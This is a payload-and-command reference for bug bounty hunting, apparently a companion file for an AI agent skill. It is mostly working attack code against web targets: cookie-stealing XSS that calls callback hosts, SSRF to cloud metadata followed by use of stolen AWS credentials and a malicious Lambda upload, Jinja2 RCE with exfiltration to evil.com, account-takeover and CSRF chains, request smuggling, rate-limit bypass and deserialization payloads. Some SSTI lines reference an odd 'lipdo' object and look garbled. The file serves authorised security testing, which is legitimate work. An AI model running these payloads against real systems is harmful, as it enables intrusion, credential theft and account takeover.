# Security Bounty Hunter — Payloads & Commands

> Companion to `SKILL.md`. Contains attack payloads, tool configurations, and command sequences organized by bounty hunting phase.

---

## Quick Start Checklist

```
1. Read scope/policy → 2. Recon surface → 3. Static triage → 4. Manual trace → 5. PoC → 6. Report
```

---

## Phase 1: Reconnaissance Commands

### Subdomain and Asset Discovery

```bash
# Subdomain enumeration
subfinder -d target.com -silent | sort -u

# DNS resolution
cat subdomains.txt | dnsx -silent -a -resp

# HTTP probing
cat resolved.txt | httpx -silent -status-code -title -tech-detect

# Wayback machine URL discovery
cat target.com | waybackurls | sort -u | grep -E "\.(js|json|xml|conf|bak|old)"

# GitHub dorking for secrets
github-dorks -r target-org -o github_results.txt

# Google dorking for exposed files
# site:target.com filetype:log OR filetype:conf OR filetype:bak OR filetype:env
```

### Technology Fingerprinting

```bash
# Web technology detection
whatweb -v https://target.com

# JavaScript file discovery and analysis
cat js_urls.txt | hakrawler -js -depth 2
# Then grep for: API keys, tokens, internal API endpoints, hidden parameters
```

---

## Phase 2: Static Analysis Rules

### Semgrep Custom Rules

```yaml
# Save as bounty-rules.yml
rules:
  # SSRF via user-controlled URL
  - id: bounty-ssrf
    patterns:
      - pattern: |
          requests.get($URL, ...)
      - pattern-inside: |
          def $FUNC(..., $PARAM, ...):
            ...
            $URL = $PARAM
    message: "Potential SSRF — user-controlled URL passed to requests.get"
    severity: ERROR
    languages: [python]

  # SQL injection via string formatting
  - id: bounty-sqli
    patterns:
      - pattern: |
          cursor.execute(f"...{$VAR}...")
    message: "SQL injection via f-string formatting"
    severity: ERROR
    languages: [python]

  # Command injection via subprocess
  - id: bounty-cmdi
    patterns:
      - pattern: |
          subprocess.call($CMD + $INPUT, shell=True)
    message: "Command injection via shell=True with string concatenation"
    severity: ERROR
    languages: [python]
```

```bash
# Run custom rules
semgrep --config=bounty-rules.yml --json target_code/ -o results.json

# Filter for network-reachable findings
cat results.json | jq '.results[] | select(.extra.metadata.category == "security")'
```

### Nuclei Custom Templates

```yaml
# Save as bounty-sqli.yaml
id: bounty-sqli-test

info:
  name: SQL Injection Bounty Test
  author: kali-claw
  severity: high

http:
  - method: GET
    path:
      - "{{BaseURL}}/{{path}}?{{param}}=' OR '1'='1"
      - "{{BaseURL}}/{{path}}?{{param}}=1' AND '1'='1'--"
    stop-at-first-match: true
    matchers:
      - type: word
        words:
          - "SQL syntax"
          - "mysql_fetch"
          - "ORA-01756"
          - "PostgreSQL query failed"
        condition: or
```

```bash
nuclei -u https://target.com -t bounty-sqli.yaml -v -o nuclei_results.txt
```

---

## Phase 3: Exploitation Payloads

### SQL Injection Payloads

```bash
# Authentication bypass
sqlmap -u "https://target.com/login" --data="user=admin&pass=test" --batch --level=3 --risk=2

# Union-based extraction
sqlmap -u "https://target.com/api/items?id=1" --union-cols=5-10 --dbs

# Blind boolean-based
sqlmap -u "https://target.com/search?q=test" --technique=B --boolean-test="1=1"
```

### SSRF Payloads

```bash
# Cloud metadata (AWS)
curl -X POST https://target.com/api/fetch \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'

# Cloud metadata (GCP)
curl -X POST https://target.com/api/fetch \
  -d '{"url":"http://metadata.google.internal/computeMetadata/v1/"}' \
  -H "Metadata-Flavor: Google"

# Internal service discovery
curl -X POST https://target.com/api/fetch \
  -d '{"url":"http://localhost:6379/INFO"}'
```

### XSS Payloads

```bash
# Reflected XSS
curl "https://target.com/search?q=<script>document.location='https://callback.example.com/?c='+document.cookie</script>"

# DOM-based XSS
curl "https://target.com/page#<img/src=x onerror=fetch('https://callback.example.com/?c='+document.cookie)>"

# Stored XSS via user profile
curl -X PUT "https://target.com/api/profile" \
  -H "Content-Type: application/json" \
  -d '{"bio":"<img src=x onerror=alert(1)>","name":"test"}'
```

### Auth Bypass Payloads

```bash
# IDOR enumeration
for i in $(seq 1 100); do
  curl -s -b "session=$SESSION" "https://target.com/api/users/$i/profile" | grep -q "email" && echo "IDOR: /api/users/$i"
done

# Parameter pollution
curl "https://target.com/api/user?id=123&id=456"

# HTTP method tampering
curl -X PUT "https://target.com/admin/users"
curl -X DELETE "https://target.com/admin/users/1"
```

### Path Traversal Payloads

```bash
# Basic traversal
curl "https://target.com/download?file=../../../etc/passwd"

# Encoding bypass
curl "https://target.com/download?file=..%2f..%2f..%2fetc%2fpasswd"

# Double encoding
curl "https://target.com/download?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd"
```

---

## Phase 4: Burp Suite Configuration

```
1. Proxy → Intercept → Off (passive collection)
2. Target → Site Map → Filter by MIME type (HTML, JSON, JS)
3. Scanner → Active scan → Selected URLs only
4. Intruder → Cluster bomb for parameter fuzzing
5. Logger → Log all requests for evidence
```

### Intruder Parameter Fuzzing List

```
page id user file path url redirect callback next return dest
destination redir redirect_uri redirect_url rurl go target
```

---

## Phase 5: PoC Templates

### Minimal Safe PoC Template

```bash
#!/bin/bash
# PoC: [Vulnerability Type] in [Component]
# Severity: [Critical/High/Medium/Low]
# Date: $(date +%Y-%m-%d)

TARGET="https://target.com"
echo "[*] Testing [vulnerability]..."
RESPONSE=$(curl -s -i "$TARGET/api/endpoint" \
  -H "Content-Type: application/json" \
  -d '{"param":"PAYLOAD"}')

echo "[*] Response:"
echo "$RESPONSE"

if echo "$RESPONSE" | grep -q "EXPECTED_INDICATOR"; then
  echo "[+] VULNERABLE: [description]"
else
  echo "[-] Not vulnerable"
fi
```

### Evidence Collection

```bash
# Capture full request/response with timestamps
curl -v -s -i "$TARGET/api/endpoint" \
  -H "X-Custom: payload" \
  -d '{"data":"test"}' \
  -o evidence_$(date +%Y%m%d_%H%M%S).txt 2>&1
```

---

## Phase 6: Report Templates

### Critical Severity Finding Template

```markdown
## [CVE-TBD] Remote Code Execution via [Component]

**Severity**: Critical (CVSS 9.8)
**Component**: /api/v1/process (handler.py:42-67)
**Authentication**: None required

### Description
[What the vulnerability is and why it matters]

### Proof of Concept
```bash
curl -X POST https://target.com/api/v1/process \
  -H "Content-Type: application/json" \
  -d '{"command":"id"}'
# Response: uid=33(www-data) gid=33(www-data)
```

### Impact
Unauthenticated RCE enabling full system compromise.

### Remediation
1. Remove shell=True from subprocess calls
2. Implement strict input validation with allowlist
```

### High Severity Finding (IDOR) Template

```markdown
## Insecure Direct Object Reference in User API

**Severity**: High (CVSS 7.5)
**Component**: /api/v1/users/{id}/profile

### Proof of Concept
```bash
curl -H "Authorization: Bearer $USER_A_TOKEN" \
  https://target.com/api/v1/users/456/profile
# Returns User B's full profile data
```

### Remediation
1. Verify requesting_user.id == requested_user.id
2. Implement object-level authorization middleware
```

---

## Phase 6: Automation Scripts

### Subdomain Takeover Scanner

```bash
#!/bin/bash
# Check for dangling CNAME records indicating subdomain takeover
while read sub; do
    cname=$(dig +short CNAME "$sub" | head -1)
    if [ -n "$cname" ]; then
        http_code=$(curl -s -o /dev/null -w "%{http_code}" "http://$sub" --max-time 5)
        if [ "$http_code" = "000" ] || [ "$http_code" = "404" ]; then
            echo "POTENTIAL TAKEOVER: $sub → $cname (HTTP $http_code)"
        fi
    fi
done < subdomains.txt
```

### Nuclei Template Runner

```bash
# Run nuclei with custom templates for bounty hunting
nuclei -l targets.txt -t ~/nuclei-templates/cves/ -severity critical,high -o critical_findings.txt
nuclei -l targets.txt -t ~/nuclei-templates/exposures/ -o exposures.txt
nuclei -l targets.txt -t ~/nuclei-templates/takeovers/ -o takeovers.txt

# Custom rate limiting for responsible testing
nuclei -l targets.txt -t custom-templates/ -rate-limit 10 -bulk-size 5 -c 3
```

### JavaScript File Analysis

```bash
# Extract endpoints from JS files
cat js_urls.txt | while read url; do
    curl -s "$url" | grep -oP '["'"'"'](/api/[^"'"'"']+)["'"'"']' | sort -u
done > api_endpoints.txt

# Find secrets in JS files
cat js_urls.txt | while read url; do
    curl -s "$url" | grep -oiE '(api[_-]?key|secret|token|password)\s*[:=]\s*["'"'"'][^"'"'"']{8,}' 
done > js_secrets.txt
```

### Parameter Discovery

```bash
# Arjun parameter discovery
arjun -u "https://target.com/api/endpoint" -m GET POST -t 10 -o params.json

# Custom parameter bruteforce
while read param; do
    code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/api?$param=test")
    if [ "$code" != "400" ]; then
        echo "VALID PARAM: $param (HTTP $code)"
    fi
done < /usr/share/wordlists/params.txt
```

### Race Condition Tester

```python
import asyncio
import aiohttp

async def race_test(url, headers, payload, concurrency=50):
    """Test for race conditions in critical endpoints"""
    async with aiohttp.ClientSession(headers=headers) as session:
        tasks = [session.post(url, json=payload) for _ in range(concurrency)]
        responses = await asyncio.gather(*tasks)
        success = sum(1 for r in responses if r.status == 200)
        print(f"Successes: {success}/{concurrency}")
        if success > 1:
            print("[!] RACE CONDITION: Multiple successes on single-use action")
        return success

asyncio.run(race_test(
    "https://target.com/api/redeem-voucher",
    {"Authorization": "Bearer TOKEN"},
    {"code": "ONCE-USE-CODE"},
    concurrency=50
))
```

### GraphQL Introspection and Enumeration

```bash
# Test introspection (often left enabled)
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name type { name } } } } }"}' | jq '.data.__schema.types[] | select(.fields != null) | {name, fields: [.fields[].name]}'

# Find hidden mutations
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { mutationType { fields { name args { name type { name } } } } } }"}' | jq .
```

### Broken Link Hijacking

```bash
# Find external links that return 404 (potential takeover)
cat wayback_urls.txt | grep -oP 'https?://[^/]+' | sort -u | while read domain; do
    code=$(curl -s -o /dev/null -w "%{http_code}" "$domain" --max-time 5)
    if [ "$code" = "000" ] || [ "$code" = "404" ]; then
        # Check if domain is available for registration
        whois $(echo "$domain" | sed 's|https\?://||') 2>/dev/null | grep -qi "no match\|not found" && \
            echo "AVAILABLE: $domain"
    fi
done
```

---

## Phase 7: Bounty Platform Utilities

### HackerOne Scope Checker

```python
import requests

def check_hackerone_scope(program, target):
    """Check if target is in scope for a HackerOne program"""
    resp = requests.get(f"https://hackerone.com/{program}/policy_scopes.json")
    scopes = resp.json().get("scopes", [])
    in_scope = [s for s in scopes if s.get("asset_type") == "URL"
                and target in s.get("asset_identifier", "")]
    out_scope = [s for s in scopes if s.get("asset_type") == "URL"
                 and s.get("eligible_for_bounty") is False
                 and target in s.get("asset_identifier", "")]
    return {"in_scope": bool(in_scope), "out_of_scope": bool(out_scope)}
```

### Finding Deduplication Check

```bash
# Search existing disclosed reports for similar findings
search_term="IDOR user profile"
curl -s "https://hackerone.com/hacktivity?queryString=$search_term&filter=type:public" \
  | grep -oP '"title":"[^"]*"' | head -20

# Check if similar CVE exists
curl -s "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=target+idor" \
  | jq '.vulnerabilities[].cve | {id, description: .descriptions[0].value}'
```

### CVSS Calculator Script

```python
def calculate_cvss31(vector):
    """Calculate CVSS 3.1 base score from vector string"""
    metrics = dict(m.split(":") for m in vector.replace("CVSS:3.1/", "").split("/"))
    
    av_scores = {"N": 0.85, "A": 0.62, "L": 0.55, "P": 0.20}
    ac_scores = {"L": 0.77, "H": 0.44}
    pr_scores = {"N": 0.85, "L": 0.62, "H": 0.27}  # Scope unchanged
    ui_scores = {"N": 0.85, "R": 0.62}
    impact_scores = {"H": 0.56, "L": 0.22, "N": 0}

    iss = 1 - ((1 - impact_scores[metrics["C"]]) *
               (1 - impact_scores[metrics["I"]]) *
               (1 - impact_scores[metrics["A"]]))
    impact = 6.42 * iss if metrics["S"] == "U" else 7.52 * (iss - 0.029) - 3.25 * (iss - 0.02)**15
    
    exploitability = 8.22 * av_scores[metrics["AV"]] * ac_scores[metrics["AC"]] * pr_scores[metrics["PR"]] * ui_scores[metrics["UI"]]
    
    if impact <= 0:
        return 0.0
    base = min(impact + exploitability, 10)
    return round(base * 10) / 10

# Example: Critical SQLi
print(calculate_cvss31("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"))  # 9.8
```

---

## Phase 8: Recon Automation Scripts

### Comprehensive Asset Discovery Pipeline

```bash
#!/bin/bash
# Full recon pipeline for a new bounty target
DOMAIN="$1"
OUTDIR="recon_$DOMAIN"
mkdir -p "$OUTDIR"/{subs,urls,ports,vulns}

echo "[1/7] Subdomain enumeration..."
subfinder -d "$DOMAIN" -silent -o "$OUTDIR/subs/raw.txt"
amass enum -passive -d "$DOMAIN" -o "$OUTDIR/subs/amass.txt"
cat "$OUTDIR"/subs/*.txt | sort -u > "$OUTDIR/subs/all.txt"

echo "[2/7] DNS resolution..."
cat "$OUTDIR/subs/all.txt" | dnsx -silent -a -resp -o "$OUTDIR/subs/resolved.txt"

echo "[3/7] HTTP probing..."
cat "$OUTDIR/subs/resolved.txt" | httpx -silent -status-code -title -tech-detect -o "$OUTDIR/urls/httpx.txt"

echo "[4/7] Port scanning..."
cat "$OUTDIR/subs/resolved.txt" | naabu -top-ports 1000 -silent -o "$OUTDIR/ports/top1k.txt"

echo "[5/7] URL collection..."
cat "$OUTDIR/subs/all.txt" | waybackurls | sort -u > "$OUTDIR/urls/wayback.txt"
cat "$OUTDIR/subs/all.txt" | gau | sort -u > "$OUTDIR/urls/gau.txt"

echo "[6/7] JavaScript analysis..."
cat "$OUTDIR/urls/httpx.txt" | hakrawler -js -depth 2 | sort -u > "$OUTDIR/urls/js_urls.txt"

echo "[7/7] Nuclei scanning..."
nuclei -l "$OUTDIR/urls/httpx.txt" -t ~/nuclei-templates/cves/ -severity critical,high -o "$OUTDIR/vulns/nuclei_critical.txt"

echo "[*] Recon complete. Results in $OUTDIR/"
```

### Automated Secret Scanner

```bash
#!/bin/bash
# Scan collected JavaScript files for secrets and sensitive data
JS_FILE="$1"

echo "[*] Scanning $JS_FILE for secrets..."

# Extract and analyze JS content
curl -s "$JS_FILE" | grep -oiE '(api[_-]?key|apikey|api[_-]?secret|access[_-]?token|auth[_-]?token|bearer|secret[_-]?key|private[_-]?key|password|aws[_-]?access|aws[_-]?secret)\s*[:=]\s*["\x27][^"\x27]{8,}["\x27]' | sort -u

# Look for Firebase URLs
curl -s "$JS_FILE" | grep -oE 'https://[a-z0-9-]+\.firebaseio\.com' | sort -u

# Look for S3 buckets
curl -s "$JS_FILE" | grep -oE 'https://[a-z0-9-]+\.s3\.[a-z0-9-]+\.amazonaws\.com' | sort -u

# Look for internal API endpoints
curl -s "$JS_FILE" | grep -oE '(https?://[a-z0-9._/-]+)?/api/v[0-9]+/[a-z/_-]+' | sort -u

# Look for hidden parameters
curl -s "$JS_FILE" | grep -oE '\{[a-zA-Z_][a-zA-Z0-9_]*\}' | tr -d '{}' | sort -u
```

---

## Phase 9: Vulnerability Chaining

### XSS-to-CSRF Chain

```javascript
// XSS payload that steals CSRF token then performs action on behalf of user
// Demonstrates impact escalation for bounty reports
fetch('/api/user/profile').then(r => r.text()).then(html => {
  var csrfToken = html.match(/name="csrf_token" value="([^"]+)"/)[1];
  fetch('/api/user/settings', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'csrf_token=' + csrfToken + '&email=attacker@evil.com'
  });
});
```

### SSRF-to-RCE Chain

```bash
# Chain SSRF to access internal metadata, then use credentials for RCE
# Step 1: SSRF to read AWS metadata
curl -s -X POST https://target.com/api/fetch \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'

# Step 2: Extract temporary credentials from response
# Step 3: Use credentials to access internal services
aws s3 ls --profile stolen-creds
aws lambda invoke --function-name internal-api --profile stolen-creds /tmp/output.json

# Step 4: Achieve RCE via Lambda function injection
aws lambda update-function-code --function-name internal-api \
  --zip-file fileb://malicious_lambda.zip --profile stolen-creds
```

### IDOR-to-Account-Takeover Chain

```python
import requests

# Chain IDOR enumeration with credential reset for full account takeover
session = requests.Session()
session.headers.update({"Authorization": "Bearer LOW_PRIV_TOKEN"})

# Step 1: Enumerate user IDs via IDOR
target_user_id = 456
profile = session.get(f"https://target.com/api/v1/users/{target_user_id}/profile").json()
email = profile["email"]

# Step 2: Initiate password reset using discovered email
session.post("https://target.com/api/v1/auth/forgot-password", json={"email": email})

# Step 3: If reset token is predictable/IDOR-accessible
reset_token = session.get(f"https://target.com/api/v1/users/{target_user_id}/reset-token").json()

# Step 4: Complete account takeover
session.post("https://target.com/api/v1/auth/reset-password", json={
    "token": reset_token["token"],
    "password": "AttackerNewPass123!",
    "user_id": target_user_id
})
```

---

## Phase 10: Report Generation

### Automated Report Builder

```python
#!/usr/bin/env python3
"""Generate a markdown vulnerability report from findings JSON."""
import json
import sys
from datetime import datetime

def generate_report(findings_file, output_file):
    with open(findings_file) as f:
        findings = json.load(f)

    report = []
    report.append(f"# Penetration Test Report")
    report.append(f"**Date**: {datetime.now().strftime('%Y-%m-%d')}")
    report.append(f"**Total Findings**: {len(findings)}")
    report.append("")

    severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    findings.sort(key=lambda x: severity_order.get(x.get("severity", "info"), 99))

    for finding in findings:
        report.append(f"## {finding['title']}")
        report.append(f"**Severity**: {finding['severity'].upper()}")
        report.append(f"**Endpoint**: `{finding.get('endpoint', 'N/A')}`")
        report.append(f"**CWE**: {finding.get('cwe', 'N/A')}")
        report.append("")
        report.append(f"### Description\n{finding.get('description', '')}")
        report.append("")
        report.append(f"### Proof of Concept\n```bash\n{finding.get('poc', '')}\n```")
        report.append("")
        report.append(f"### Impact\n{finding.get('impact', '')}")
        report.append("")
        report.append(f"### Remediation\n{finding.get('remediation', '')}")
        report.append("---")

    with open(output_file, "w") as f:
        f.write("\n".join(report))
    print(f"Report written to {output_file}")

generate_report(sys.argv[1], sys.argv[2])
```

---

## Phase 11: Scope Management

### Scope Boundary Checker

```python
#!/usr/bin/env python3
"""Verify targets are within bounty program scope before testing."""
import json
import re
import sys
from urllib.parse import urlparse

def load_scope(policy_file):
    with open(policy_file) as f:
        policy = json.load(f)
    return policy.get("in_scope", []), policy.get("out_of_scope", [])

def is_in_scope(target_url, in_scope, out_of_scope):
    parsed = urlparse(target_url)
    hostname = parsed.hostname or ""

    in_matched = any(
        re.match(pattern.replace(".", r"\.").replace("*", ".*"), hostname)
        for pattern in in_scope
    )

    out_matched = any(
        re.match(pattern.replace(".", r"\.").replace("*", ".*"), hostname)
        for pattern in out_of_scope
    )

    if out_matched:
        return False, "EXPLICITLY OUT OF SCOPE"
    if in_matched:
        return True, "IN SCOPE"
    return False, "NOT IN SCOPE DECLARATIONS"

if __name__ == "__main__":
    in_scope, out_scope = load_scope("scope_policy.json")
    for url in sys.argv[1:]:
        ok, reason = is_in_scope(url, in_scope, out_scope)
        status = "OK" if ok else "BLOCKED"
        print(f"[{status}] {url} - {reason}")
```

---

## Phase 12: Duplicate Detection

### Finding Similarity Checker

```python
#!/usr/bin/env python3
"""Check if a new finding duplicates existing disclosed reports."""
import json
import re
from collections import Counter

def tokenize(text):
    words = re.findall(r'[a-z0-9]+', text.lower())
    return Counter(words)

def similarity(report_a, report_b):
    tokens_a = tokenize(report_a)
    tokens_b = tokenize(report_b)
    intersection = sum((tokens_a & tokens_b).values())
    union = sum((tokens_a | tokens_b).values())
    return intersection / union if union else 0.0

def check_duplicates(new_finding, existing_reports, threshold=0.6):
    dupes = []
    for report in existing_reports:
        sim = similarity(new_finding, report["title"] + " " + report.get("description", ""))
        if sim >= threshold:
            dupes.append({"report_id": report["id"], "similarity": round(sim, 3)})
    dupes.sort(key=lambda x: x["similarity"], reverse=True)
    return dupes
```

---

## Phase 13: Payout Optimization

### Impact-to-Payout Estimator

```python
#!/usr/bin/env python3
"""Estimate bounty payout based on vulnerability type, severity, and context."""

PAYOUT_RANGES = {
    "critical": {"min": 2000, "max": 15000},
    "high":     {"min": 500,  "max": 5000},
    "medium":   {"min": 100,  "max": 1500},
    "low":      {"min": 50,   "max": 500},
    "info":     {"min": 0,    "max": 100},
}

MULTIPLIERS = {
    "auth_bypass": 1.5,
    "data_access": 1.3,
    "rce": 2.0,
    "chain": 1.8,
    "unauthenticated": 1.5,
    "admin_required": 0.7,
    "default_config": 1.2,
}

def estimate_payout(severity, vuln_type, context_tags):
    base = PAYOUT_RANGES.get(severity, PAYOUT_RANGES["info"])
    mid = (base["min"] + base["max"]) / 2
    for tag in context_tags:
        mid *= MULTIPLIERS.get(tag, 1.0)
    return {
        "severity": severity,
        "type": vuln_type,
        "estimated_low": int(base["min"] * 0.8),
        "estimated_mid": int(mid),
        "estimated_high": int(base["max"] * 1.2),
        "tags": context_tags,
    }

# Example usage
result = estimate_payout("critical", "rce", ["unauthenticated", "rce", "chain"])
print(f"Estimated payout: ${result['estimated_low']}-${result['estimated_high']}")
```

---

## Phase 14: Advanced Exploitation Scripts

### HTTP Request Smuggling Tester

```python
#!/usr/bin/env python3
"""Test for HTTP request smuggling vulnerabilities."""
import socket
import time

def test_smuggling(host, port, method="CLTE"):
    """Test CL.TE and TE.CL request smuggling."""
    payloads = {
        "CLTE": (
            f"POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: 13\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"SMUGGLED"
        ),
        "TECL": (
            f"POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: 3\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"8\r\n"
            f"SMUGGLED\r\n"
            f"0\r\n"
            f"\r\n"
        ),
    }

    for name, payload in payloads.items():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        sock.send(payload.encode())
        time.sleep(2)
        response = sock.recv(4096).decode(errors="replace")
        print(f"[{name}] Response length: {len(response)}")
        if "SMUGGLED" in response:
            print(f"[!] VULNERABLE: {name} smuggling detected")
        sock.close()

test_smuggling("target.com", 80)
```

### Web Cache Poisoning Tester

```bash
#!/bin/bash
# Test for web cache poisoning via unkeyed headers

TARGET="https://target.com"
CACHE_HEADERS=(
  "X-Forwarded-Host: evil.com"
  "X-Forwarded-Scheme: nothttps"
  "X-Host: evil.com"
  "X-Original-URL: /admin"
  "X-Rewrite-URL: /admin"
)

for header in "${CACHE_HEADERS[@]}"; do
  echo "[*] Testing header: $header"
  # First request with malicious header
  FIRST=$(curl -s -H "$header" "$TARGET" -o /tmp/cache_test_1.html -w "%{http_code}")
  # Second request without header
  SECOND=$(curl -s "$TARGET" -o /tmp/cache_test_2.html -w "%{http_code}")

  if diff /tmp/cache_test_1.html /tmp/cache_test_2.html > /dev/null 2>&1; then
    echo "[!] CACHE POISONED: Responses identical with header: $header"
  fi
done
```

### GraphQL Depth Limit Testing

```bash
# Test GraphQL query depth limits (DoS potential)
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users { friends { friends { friends { friends { id } } } } } }"}'

# Batch query attack
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"{ user(id:1) { email } }"},{"query":"{ user(id:2) { email } }"},{"query":"{ user(id:3) { email } }"}]'
```

---

## Phase 15: Mass Assignment and API Testing

### Mass Assignment Testing

```bash
# Test for mass assignment vulnerabilities
# Try adding privileged fields to API requests

# Add admin role to user registration
curl -X POST https://target.com/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"testuser","email":"test@test.com","password":"Test123!","role":"admin"}'

# Add is_admin flag to profile update
curl -X PUT https://target.com/api/profile \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name":"Test","is_admin":true,"is_verified":true}'

# Attempt privilege escalation via group field
curl -X PATCH https://target.com/api/users/me \
  -d '{"email":"test@test.com","groups":["admin","superadmin"]}'

# Test internal fields exposure
curl -X POST https://target.com/api/users \
  -d '{"name":"test","__v":0,"_id":"admin_user_id","permissions":["all"]}'
```

### API Rate Limit Bypass Testing

```bash
# Test rate limit bypass techniques

# X-Forwarded-For rotation
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code}" \
    -H "X-Forwarded-For: 10.0.0.$((RANDOM % 254 + 1))" \
    -X POST https://target.com/api/login \
    -d '{"user":"admin","pass":"wrong"}'
done

# API key rotation
curl -s https://target.com/api/endpoint -H "X-API-Key: key1"
curl -s https://target.com/api/v1/endpoint -H "X-API-Key: key1"
curl -s https://target.com/api/v2/endpoint -H "X-API-Key: key1"

# HTTP/2 multiplexing to bypass rate limits
curl --http2 -X POST https://target.com/api/login -d '{"user":"admin","pass":"test"}'
```

---

## Phase 16: Server-Side Template Injection

### SSTI Detection Payloads

```bash
# Jinja2 (Python) detection
curl "https://target.com/search?q={{7*7}}"
curl "https://target.com/search?q={{config}}"
curl "https://target.com/search?q={{self.__class__.__mro__}}"

# Twig (PHP) detection
curl "https://target.com/search?q={{7*7}}"
curl "https://target.com/search?q={{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"

# Freemarker (Java) detection
curl "https://target.com/search?q=\${7*7}"
curl "https://target.com/search?q=<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"

# ERB (Ruby) detection
curl "https://target.com/search?q=<%= 7*7 %>"
curl "https://target.com/search?q=<%= system('id') %>"
```

### SSTI Exploitation (Jinja2 RCE)

```bash
# Jinja2 remote code execution
curl "https://target.com/search?q={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"

# Alternative Jinja2 RCE via lipdo
curl "https://target.com/search?q={{lipdo.__globals__['os'].popen('cat+/etc/passwd').read()}}"

# Blind SSTI with out-of-band callback
curl "https://target.com/search?q={{lipdo.__globals__['os'].popen('curl+https://evil.com/$(whoami)').read()}}"
```

---

## Phase 17: Second-Order Injection Testing

### Second-Order SQLi Testing

```bash
# Test for second-order SQL injection
# Step 1: Store payload in database
curl -X POST https://target.com/api/users \
  -H "Content-Type: application/json" \
  -d '{"username": "test\" OR \"1\"=\"1", "email": "test@test.com"}'

# Step 2: Trigger stored payload in different endpoint
curl "https://target.com/api/admin/export?format=csv"
curl "https://target.com/api/search?saved_query=test\" OR \"1\"=\"1"

# Step 3: Check if stored payload executes in backend
curl "https://target.com/api/reports?filter_username=test\" OR \"1\"=\"1"
```

### Second-Order XSS Testing

```bash
# Step 1: Store XSS payload
curl -X POST https://target.com/api/support/ticket \
  -H "Content-Type: application/json" \
  -d '{"subject": "Help needed", "body": "<img src=x onerror=alert(document.cookie)>"}'

# Step 2: Trigger in admin panel (victim views the ticket)
curl -b "admin_session=admin_token" "https://target.com/admin/tickets/1"

# Step 3: Test via email notification rendering
curl -b "admin_session=admin_token" "https://target.com/api/tickets/1/preview"
```

### Deserialization Attack Testing

```bash
# Java deserialization detection
curl "https://target.com/api/data" \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @/tmp/payload.ser

# PHP deserialization
curl "https://target.com/api/session" \
  -H "Cookie: session=O:8:\"stdClass\":1:{s:4:\"test\";s:4:\"evil\";}"

# Python pickle deserialization
curl "https://target.com/api/cache" \
  -H "X-Cache-Key: $(python3 -c "import pickle,base64;print(base64.b64encode(pickle.dumps({'__reduce__':(eval,('print(1)',))}))).decode())")"
```

---

## Phase 18: Account Takeover Automation

### Password Reset Flow Testing

```bash
# Test password reset token predictability
# Step 1: Request reset for multiple accounts
for i in 1 2 3 4 5; do
  curl -s -X POST https://target.com/api/reset-password \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"user$i@test.com\"}" &
done
wait

# Step 2: Check email for tokens and analyze pattern
# If tokens are sequential or time-based:
echo "Analyzing token patterns..."

# Step 3: Test token reuse
curl -s -X POST https://target.com/api/reset-password/confirm \
  -d '{"token":"FIRST_TOKEN","password":"NewPass123!"}'
# Try same token again
curl -s -X POST https://target.com/api/reset-password/confirm \
  -d '{"token":"FIRST_TOKEN","password":"AnotherPass123!"}'
```

### OAuth Flow Testing

```bash
# Test OAuth CSRF (missing state parameter)
curl -s "https://target.com/auth/callback?code=STOLEN_AUTH_CODE"

# Test open redirect in OAuth flow
curl -s "https://target.com/auth/login?redirect_uri=https://evil.com/steal"

# Test token leakage via referrer
curl -s "https://target.com/auth/callback?code=TOKEN" \
  -H "Referer: https://target.com/dashboard#access_token=leaked"

# Test OAuth token reuse across clients
curl -s "https://target.com/api/user" \
  -H "Authorization: Bearer STOLEN_OAUTH_TOKEN"
```
